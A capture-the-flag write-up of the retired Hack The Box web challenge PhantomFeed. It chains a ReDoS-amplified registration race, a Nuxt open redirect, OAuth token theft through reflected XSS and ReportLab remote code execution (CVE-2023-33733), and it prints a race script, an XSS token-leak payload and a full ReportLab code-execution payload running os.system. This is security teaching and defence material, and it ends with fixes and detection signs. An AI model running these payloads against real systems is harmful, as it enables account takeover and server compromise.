---
title: "Hack The Box Challenge — PhantomFeed"
summary: "PhantomFeed chains a ReDoS-amplified registration race, Nuxt open redirect and OAuth token theft with ReportLab RCE to recover the flag."
platform: "Hack The Box"
contentType: "challenge"
publicationPolicy: "retired"
challengeCategory: "Web"
difficulty: "Hard"
solvedAt: 2026-09-14
publishedAt: 2026-09-14
tags:
  - web-security
  - race-condition
  - regular-expression-dos
  - oauth2
  - open-redirect
  - cross-site-scripting
  - reportlab
  - remote-code-execution
  - source-code-review
tools:
  - tree
  - ripgrep
  - curl
  - Python
  - Burp Suite
cves:
  - CVE-2023-33733
htbUrl: "https://app.hackthebox.com/challenges/PhantomFeed"
cover: "/images/writeups/hackthebox/challenges/shared/hackthebox-challenge-cover.webp"
coverAlt: "Abstract cybersecurity challenge medallion with terminal, puzzle and network motifs"
featured: false
draft: false
---

> **Authorized-lab notice:** This write-up documents the retired Hack The Box Challenge PhantomFeed. Retirement and publication eligibility were confirmed on 14 September 2026 from the challenge page and the available official write-up. The flag, JWTs, cookies, credentials, ephemeral target details, VPN address and webhook identifier have been removed. The original challenge package is not redistributed.

More retired Hack The Box material is available in the [write-ups archive](/writeups/) and the focused [Challenges archive](/writeups/challenges/).

## Executive summary

PhantomFeed is a source-assisted Web challenge composed of a Flask forum, a Nuxt marketplace, a Flask resource server and an administrator browser bot. Its intended security boundaries fail in sequence.

Registration first commits a new account with `verified=True`, parses the supplied email, and only then changes the account to `verified=False`. A catastrophically backtracking email causes enough delay to win this race and obtain a normal user JWT. A Nuxt triple-slash open redirect then sends the administrator bot to the internal OAuth token endpoint. The authorization code is not bound to the user who created it, so the endpoint issues an administrator access token. Because the attacker-controlled `redirect_url` is reflected into a browser-rendered response, JavaScript can copy that token into a same-origin forum post.

The stolen token unlocks the marketplace's PDF export endpoint. It inserts the `color` parameter into ReportLab markup and processes it with vulnerable ReportLab 3.6.12. A CVE-2023-33733 payload executes Python expressions, copies the randomized flag file into the forum's static directory and makes it retrievable over HTTP. The returned value is intentionally omitted.

## Challenge information

| Item | Value |
| --- | --- |
| Name | `PhantomFeed` |
| Platform | Hack The Box |
| Category | Web |
| Difficulty | Hard |
| Status | Retired, confirmed 14 September 2026 |
| Exposed application | Forum, OAuth provider and marketplace behind one nginx listener |
| Core chain | ReDoS-assisted race → Nuxt open redirect → OAuth token theft/XSS → ReportLab RCE |

The scenario describes an underground forum connected to a marketplace. That relationship made authentication state, OAuth transitions, browser-bot behavior and trust between the three web applications the most valuable review targets.

## Provided material and evidence boundaries

The challenge package exposed the complete application source and deployment configuration:

```text
challenge/
├── phantom-feed/              # Flask forum, OAuth provider and admin bot
├── phantom-market-backend/    # Flask API and PDF export
└── phantom-market-frontend/   # Nuxt marketplace
conf/
├── nginx.conf
└── supervisord.conf
Dockerfile
entrypoint.sh
flag.txt
```

The package was reviewed locally but is not included in this repository. Evidence retained for this article includes the source tree, selected source listings, live HTTP responses, failed race and callback attempts, the successful user and administrator JWT claims, the successful backend requests and the official retired-challenge write-up used for verification.

All commands below use `http://<TARGET>:<PORT>`. Tokens and credentials use placeholders, and the final response body is shown only as `<REDACTED_FLAG>`.

## Initial analysis

The first pass searched for the boundaries connecting OAuth, sessions, browser automation and document generation:

```bash
tree .

rg -n -i \
  --glob '!**/static/**' \
  'oauth|redirect_url|client_id|token|jwt|verified|bot_runner|reportlab|Paragraph' \
  challenge conf Dockerfile entrypoint.sh
```

nginx revealed three internal services behind one public listener:

| Public path | Internal destination | Role |
| --- | --- | --- |
| `/` | `127.0.0.1:5000` | Nuxt marketplace |
| `/phantomfeed` | `127.0.0.1:3000` | Forum and OAuth provider |
| `/backend` | `127.0.0.1:4000` | Marketplace resource server |

Supervisor runs all three applications as `root`. The entrypoint also renames the flag on every launch:

```sh
mv /flag.txt /flag$(cat /dev/urandom | tr -cd 'a-f0-9' | head -c 10).txt
```

The exact filename is unpredictable, but the stable glob `/flag*.txt` remains available to any process with sufficient permissions.

## Identifying the weaknesses

### 1. Verification race amplified by ReDoS

The registration route performs these operations in an unsafe order:

```python
user_valid, user_id = db_session.create_user(username, password, email)
email_client = EmailClient(email)
verification_code = db_session.add_verification(user_id)
```

The `Users.verified` column defaults to `True`, and `create_user()` commits the row before `EmailClient` is constructed. Only `add_verification()` changes it to `False`. Meanwhile, login explicitly selects accounts where `verified == True`.

The email parser sits inside that gap:

```python
pattern = r"^([0-9a-zA-Z]([-.\w]*[0-9a-zA-Z])*@(([0-9a-zA-Z])+([-\w]*[0-9a-zA-Z])*\.)+[a-zA-Z]{2,9})$"
match = re.match(pattern, email)
```

Nested, overlapping repetitions make the expression vulnerable to catastrophic backtracking. The executed payload was:

```text
a@aaaaaaaaaaaaaaaaaaaaaaaaaa!
```

It resembles a valid address for long enough to force extensive backtracking at the final invalid character. This stretches the interval between the initial commit and the verification update, allowing a concurrent login to observe `verified=True`.

### 2. The OAuth code is not bound to its creator

`generate_authorization_code()` accepts a username argument but stores only the code, `client_id`, `redirect_url` and expiry. At redemption, `/oauth2/token` validates those stored values and creates a JWT from the identity attached to the request:

```python
if not verify_authorization_code(authorization_code, client_id, redirect_url):
    return render_template("error.html", error="access denied"), 401

access_token = create_jwt(
    request.user_data["user_id"],
    request.user_data["username"]
)
```

Consequently, a code created by the attacker can be redeemed in an administrator-authenticated browser and produce an administrator token. The code record does not preserve the authorizing principal.

### 3. The administrator bot accepts a cross-port navigation primitive

Posts accept a user-controlled `market_link` and immediately invoke `bot_runner(market_link)`. The bot first visits the Nuxt service, creates an HttpOnly administrator cookie for `127.0.0.1`, and then concatenates the supplied link:

```python
client.get("http://127.0.0.1:5000")
client.add_cookie(cookie)
client.get("http://127.0.0.1:5000" + link)
```

The bundled marketplace uses Nuxt 2.15.7 and vue-router 3.5.2. The triple-slash path behavior documented in Nuxt issue 10319 allows a value beginning with `///` to escape the expected route and navigate to another authority-like destination:

```text
///127.0.0.1:1337/phantomfeed/oauth2/token?...
```

The hostname remains `127.0.0.1`, so the domain cookie is still sent even though the port changes from `5000` to `1337`.

### 4. Reflected HTML in the OAuth token response

After issuing an access token, the OAuth endpoint returns a bare serialized string:

```python
return json.dumps({
    "access_token": access_token,
    "token_type": "JWT",
    "expires_in": current_app.config["JWT_LIFE_SPAN"],
    "redirect_url": redirect_url
})
```

The attacker-controlled `redirect_url` is therefore reflected into a response that the browser handles as HTML rather than a safely encoded JSON API response. A `<script>` value executes in the PhantomFeed origin and can read the serialized response body. The administrator cookie remains HttpOnly, but it does not need to be read: the newly issued access token is present directly in the DOM.

### 5. ReportLab markup reaches an unsafe evaluator

The marketplace backend pins `reportlab==3.6.12`. Its administrator-only export route inserts `color` into this template:

```html
<para>
    <font color="{{ color }}">
        Orders:
    </font>
</para>
```

The rendered string is passed to `reportlab.platypus.Paragraph`. ReportLab 3.6.12 is affected by CVE-2023-33733, where specially constructed color expressions can escape the intended `rl_safe_eval` restrictions and execute Python code.

## Chronological solution

### 1. Winning the registration race

A normal registration completed in approximately 0.40 seconds in the active instance:

```text
status=200 total=0.401132s
```

Early attempts used invalid email strings containing only `a` characters, which never reached the vulnerable part of the regex in the intended way. Attempts with a 1.40-second login delay were also too late. The successful tuning started registration with the correct ReDoS payload, waited 0.15 seconds and then issued up to 40 login attempts at 0.01-second intervals.

The following is a sanitized reconstruction of the final `pf-race3.sh` logic. The complete original file was not retained in the transcript, but its endpoint sequence, payload, timing and loop counts match the successful execution:

```bash
#!/usr/bin/env bash
set -u

target="${1:?usage: $0 http://TARGET:PORT}"
user="race$(date +%s%N)"
pass="RacePass$(date +%s%N)"
email='a@aaaaaaaaaaaaaaaaaaaaaaaaaa!'
register_log="$(mktemp)"
token=''

curl -sS --max-time 60 \
  -X POST "$target/phantomfeed/register" \
  -H 'Content-Type: application/x-www-form-urlencoded' \
  --data-urlencode "username=$user" \
  --data-urlencode "password=$pass" \
  --data-urlencode "email=$email" \
  > "$register_log" 2>&1 &

sleep 0.15

for attempt in $(seq 1 40); do
  headers="$(
    curl -sS -D - -o /dev/null --max-time 5 \
      -X POST "$target/phantomfeed/login" \
      -H 'Content-Type: application/x-www-form-urlencoded' \
      --data-urlencode "username=$user" \
      --data-urlencode "password=$pass" 2>/dev/null
  )"

  token="$(
    printf '%s\n' "$headers" |
      sed -n 's/^Set-Cookie: token=\([^;]*\).*/\1/p' |
      tr -d '\r' |
      head -n 1
  )"

  [ -n "$token" ] && break
  sleep 0.01
done

if [ -z "$token" ]; then
  printf 'Race failed; use a fresh account and retry.\n'
  exit 1
fi

printf 'Race succeeded; user JWT length: %s\n' "${#token}"
curl -sS -o /dev/null \
  -w 'Feed HTTP %{http_code}\n' \
  --cookie "token=$token" \
  "$target/phantomfeed/feed"
```

The verified run returned:

```text
RACE SUCCEEDED
USER_JWT: <REDACTED_USER_JWT>
Testing feed:
HTTP 200
```

The script uses a fresh account on every attempt because a completed registration leaves that username unverified. It also extracts only the `token` cookie from response headers and never follows the login redirect while checking the race.

### 2. Creating an OAuth code with a same-origin payload

External callbacks initially proved unreliable. The final payload avoided all dependency on public webhook delivery or a reverse route to the VPN address. Instead, JavaScript running as the administrator created a new forum post containing the token response:

```bash
PF_JS="fetch('/phantomfeed/feed',{method:'POST',headers:{'Content-Type':'application/x-www-form-urlencoded'},body:new URLSearchParams({content:'ADMINLEAK:'+document.documentElement.innerText,market_link:'/'}),keepalive:true})"

PF_JS_B64="$(printf '%s' "$PF_JS" | base64 -w0)"
PF_XSS="<script>eval(atob('${PF_JS_B64}'))</script>"
```

The normal user requested a fresh code whose stored redirect URL exactly matched that XSS string:

```bash
PF_HEADERS="$(mktemp)"

curl -sS \
  -D "$PF_HEADERS" \
  -o /dev/null \
  -w 'HTTP %{http_code}\n' \
  --cookie "token=$PF_USER_JWT" \
  --get "$PF_TARGET/phantomfeed/oauth2/code" \
  --data-urlencode 'client_id=phantom-market' \
  --data-urlencode "redirect_url=$PF_XSS"

PF_CODE="$(
  tr -d '\r' < "$PF_HEADERS" |
    sed -n 's/^[Ll]ocation:.*authorization_code=\([^&[:space:]]*\).*/\1/p' |
    head -n 1
)"

printf 'Code length: %s\n' "${#PF_CODE}"
```

The response confirmed a redirect and a non-empty code:

```text
HTTP 303
Code length: 784
```

The exact XSS string must be preserved. `verify_authorization_code()` compares the submitted `redirect_url` with the database record, and the code is single-use and short-lived.

### 3. Sending the administrator bot through the open redirect

The XSS was URL-encoded once for its position inside the token endpoint query:

```bash
PF_XSS_ENCODED="$(
  python3 -c \
    'import sys,urllib.parse; print(urllib.parse.quote(sys.argv[1],safe=""))' \
    "$PF_XSS"
)"

PF_BOT_LINK="///127.0.0.1:1337/phantomfeed/oauth2/token?authorization_code=${PF_CODE}&client_id=phantom-market&redirect_url=${PF_XSS_ENCODED}"
```

Posting that link triggered the bot:

```bash
curl -sS \
  --max-time 120 \
  -o /tmp/internal-bot-response \
  -w 'HTTP %{http_code}\n' \
  -X POST "$PF_TARGET/phantomfeed/feed" \
  --cookie "token=$PF_USER_JWT" \
  -H 'Content-Type: application/x-www-form-urlencoded' \
  --data-urlencode 'content=internal token test' \
  --data-urlencode "market_link=$PF_BOT_LINK"
```

The successful request returned:

```text
HTTP 302
```

The bot reached the token endpoint with its administrator cookie, redeemed the attacker's code, received an administrator access token, executed the reflected script and POSTed the DOM text back into the forum.

### 4. Recovering and validating the administrator token

The normal user session could read the new public post:

```bash
curl -sS \
  --cookie "token=$PF_USER_JWT" \
  "$PF_TARGET/phantomfeed/feed" \
  > /tmp/feed-leak.html

grep -n -A4 -B2 'ADMINLEAK' /tmp/feed-leak.html
```

The useful result was:

```html
<img ... name=administrator ...>&nbsp;administrator
<p>ADMINLEAK:{"access_token":"<REDACTED_ADMIN_JWT>",
   "token_type":"JWT","expires_in":1800,"redirect_url":"...</p>
```

The token was extracted and its payload decoded locally:

```bash
export PF_ADMIN_TOKEN="$(
  grep 'ADMINLEAK' /tmp/feed-leak.html |
    grep -oE 'eyJ[A-Za-z0-9_-]+\.[A-Za-z0-9_-]+\.[A-Za-z0-9_-]+' |
    head -n 1
)"

python3 - <<'PY'
import base64
import json
import os

payload = os.environ["PF_ADMIN_TOKEN"].split(".")[1]
payload += "=" * (-len(payload) % 4)
print(json.dumps(json.loads(base64.urlsafe_b64decode(payload)), indent=2))
PY
```

The verified claims were:

```json
{
  "iss": "phantomfeed-auth-server",
  "user_id": 1,
  "username": "administrator",
  "user_type": "administrator"
}
```

The original expiration timestamp and full signature are omitted because they add no learning value and expose a session artifact.

### 5. Creating the prerequisite order

The PDF endpoint exits early when no orders exist, so an order must be created before the `color` value reaches ReportLab:

```bash
curl -sS \
  -X POST "$PF_TARGET/backend/order/1" \
  -H "Authorization: Bearer $PF_ADMIN_TOKEN"
```

```json
{"message":"Order placed"}
```

### 6. Exploiting ReportLab 3.6.12

The final payload is the public CVE-2023-33733 `Word`/type-confusion technique adapted to the deployment. The official example referenced `/flag.txt`, but `entrypoint.sh` had already randomized the actual filename. The executed command therefore used `/flag*.txt` and copied the result to a predictable static path:

```bash
PF_RL_PAYLOAD="[[getattr(pow,Word('__globals__'))['os'].system('cp /flag*.txt /app/phantom-feed/application/static/flag.txt') for Word in [orgTypeFun('Word',(str,),{'mutated':1,'startswith':lambda self,x:False,'__eq__':lambda self,x:self.mutate() and self.mutated<0 and str(self)==x,'mutate':lambda self:{setattr(self,'mutated',self.mutated-1)},'__hash__':lambda self:hash(str(self))})]] for orgTypeFun in [type(type(1))]] and 'red'"

curl -sS \
  --max-time 30 \
  -o /tmp/reportlab-result \
  -w 'HTTP %{http_code}\n' \
  -X POST "$PF_TARGET/backend/orders/html" \
  -H "Authorization: Bearer $PF_ADMIN_TOKEN" \
  --data-urlencode "color=$PF_RL_PAYLOAD"
```

The backend returned:

```text
HTTP 200
```

Finally, the copied file was requested with a cache-busting query:

```bash
curl -i -sS \
  "$PF_TARGET/phantomfeed/static/flag.txt?nocache=$(date +%s)"
```

```http
HTTP/1.1 200 OK
Content-Type: text/plain; charset=utf-8
Content-Length: 35
Cache-Control: no-cache

<REDACTED_FLAG>
```

This confirms the complete chain from unauthenticated registration to administrator impersonation and server-side code execution without publishing the recovered value.

## Exploit summary

The complete attack can be reduced to four state transitions:

1. Delay email parsing after the database commit and log in before `verified` becomes false.
2. Create an OAuth code carrying a same-origin XSS payload as its exact `redirect_url`.
3. Make the administrator bot redeem that code through the Nuxt triple-slash open redirect, then publish the resulting token response into the feed.
4. Use the administrator token to create an order and submit the ReportLab expression that exposes the randomized flag through a static route.

The race helper above is a sanitized reconstruction. The OAuth, feed, token-decoding, order, ReportLab and final retrieval commands are sanitized versions of the executed commands, with only live identifiers and secrets replaced.

## Validation

Validation was performed at every trust boundary:

1. The final race run produced a user JWT and `GET /phantomfeed/feed` returned HTTP 200.
2. `/oauth2/code` returned HTTP 303 and a 784-character authorization code.
3. The bot-triggering post returned HTTP 302.
4. A new feed item authored by `administrator` contained the serialized token response.
5. Decoding the token showed `user_id: 1`, `username: administrator` and `user_type: administrator`.
6. `POST /backend/order/1` returned `{"message":"Order placed"}`.
7. The ReportLab export request returned HTTP 200.
8. The static retrieval returned HTTP 200, `text/plain`, a 35-byte body and an HTB-formatted value. That value is redacted here.

## Failed approaches and useful errors

### Invalid ReDoS inputs

The first scripts used email values made only from repeated `a` characters. Browser-side validation also rejected them because they lacked `@`. More importantly, they did not exercise the vulnerable nested domain repetitions. The correct payload begins with `a@`, supplies a long apparent domain and fails at the final `!`.

### Mistimed race attempts

Initial Python standard-library scripts waited 0.05 or 0.20 seconds and used small request waves. Later shell attempts waited 1.40 seconds. All returned only `401 invalid username/password or not verified`. Measuring a normal registration at roughly 0.40 seconds led to the successful 0.15-second starting point and tighter 0.01-second login cadence.

Race behavior remained nondeterministic: one run of the final timing failed and the next succeeded. OpenVPN was enabled between those runs, but the public target was already reachable and responded without it. The evidence supports timing variance as the cause of success; it does not establish the VPN as a prerequisite for the public endpoint.

### Installing `requests` on Kali

`pip3 install requests` failed under Kali's externally managed Python environment, and creating a virtual environment failed because `python3-venv` was not installed. The solve did not require bypassing PEP 668 or changing system packages. `curl` handled HTTP, while Python's standard library handled URL encoding and JWT payload decoding.

### Burp race configuration errors

The first Repeater request was accidentally left as `GET` while carrying a form body. After changing both registration and login to `POST`, parallel groups still failed because the email payload and timing were wrong. Burp confirmed the request structure, but the saved shell script made timing changes and fresh-account retries easier to control.

### External webhook and VPN listener

A manual webhook probe succeeded, yet the administrator bot never delivered the token callback. A later listener on `http://<VPN_IP>:8000/` also received nothing, and one bot-triggering request ended with HTTP 504. These outcomes could reflect bot egress restrictions, routing or browser behavior; the supplied evidence does not distinguish among them.

The same-origin feed exfiltration removed that uncertainty. The script posted the DOM through the already available `/phantomfeed/feed` route, so no inbound listener, public tunnel or third-party webhook was required.

### Reusing an OAuth code

A direct token request returned HTTP 401 with `access denied`. Authorization codes are validated against the exact `client_id` and `redirect_url`, expire after a short interval and are deleted after successful verification. The reliable workflow therefore generated a fresh code only after the final XSS string was ready.

## Why the full chain works

The challenge is less about one catastrophic bug than about identity and data being rebound at every layer:

1. **Database state is committed too early.** A new account is briefly trusted before verification state is written.
2. **Expensive input parsing widens the window.** ReDoS turns a tiny race into one that can be targeted with ordinary HTTP requests.
3. **OAuth state lacks subject binding.** The server validates client and redirect values but issues the token for whoever redeems the code.
4. **The bot's cookie is scoped by hostname, not port.** Moving from `127.0.0.1:5000` to `127.0.0.1:1337` retains the administrator cookie.
5. **A navigation bug crosses the expected frontend boundary.** The triple-slash value routes the bot to the internal token endpoint.
6. **Untrusted data is reflected into an HTML-capable response.** The access token becomes readable by injected JavaScript.
7. **The privileged API trusts a vulnerable parser.** ReportLab evaluates an attacker-controlled color expression.
8. **Root execution and writable static content simplify exfiltration.** A wildcard handles the randomized flag name, and the forum serves the copied file.

Every individual control protects only its local assumption. The exploit succeeds because none of those assumptions is preserved across the complete authorization flow.

## Defensive perspective

| Weakness | Defensive action |
| --- | --- |
| Account defaults to verified | Default to `False`; create the account and verification record in one transaction before it becomes login-eligible |
| Email regex permits catastrophic backtracking | Use a linear-time validation strategy, cap input length and avoid nested overlapping quantifiers |
| Login races registration | Serialize state changes or require an immutable, committed verification event before issuing any session |
| Authorization code lacks subject binding | Store and validate user ID, client ID, redirect URI, expiry, nonce and one-time-use state together |
| Arbitrary redirect URI | Pre-register exact HTTPS redirect URIs and use strict equality against the registered client configuration |
| Nuxt triple-slash navigation | Upgrade affected frontend dependencies and reject links that are absolute, protocol-relative or not on an allow-list |
| Bot has broad administrator context | Give automation a purpose-specific low-privilege account and isolate its browser/network permissions |
| Token response reflects markup | Return `jsonify(...)` with `application/json`, validate the redirect value and deploy a restrictive CSP |
| ReportLab 3.6.12 | Upgrade to a fixed release and never place untrusted expressions into ReportLab markup attributes |
| Services run as root | Run each service as a dedicated unprivileged user with read-only application and static directories |
| Static directory is writable by the backend | Separate service filesystems and deny the resource server write access to web-served paths |

Detection opportunities include bursts of login requests immediately after registration, unusually slow email validation, market links beginning with multiple slashes, OAuth redirect values containing markup, forum posts containing serialized access tokens, and PDF color parameters containing `__globals__`, `getattr`, `Word` or `os.system`.

## Key takeaways

- A secure default is not enough if application code briefly exposes an unsafe intermediate state.
- ReDoS can be an exploit amplifier for race conditions, not only a denial-of-service technique.
- OAuth authorization codes must be bound to the authorizing subject as well as the client and redirect URI.
- HttpOnly protects cookies from direct JavaScript reads, but it cannot protect secrets copied into an injectable response body.
- Same-origin exfiltration is often more dependable than external callbacks in restricted lab networks.
- Version review matters most when attacker-controlled data crosses into a complex parser such as ReportLab.
- Validate an exploit chain one trust boundary at a time; status codes, token claims and authorship markers provide stronger evidence than a single final response.

## References

- [Hack The Box — PhantomFeed](https://app.hackthebox.com/challenges/PhantomFeed)
- Hack The Box, *PhantomFeed Official Write-up* (retired challenge PDF supplied with the lab)
- [OWASP — Regular expression Denial of Service (ReDoS)](https://owasp.org/www-community/attacks/Regular_expression_Denial_of_Service-ReDoS)
- [Nuxt issue #10319 — Open redirect using triple slash](https://github.com/nuxt/nuxt/issues/10319)
- [NVD — CVE-2023-33733](https://nvd.nist.gov/vuln/detail/CVE-2023-33733)
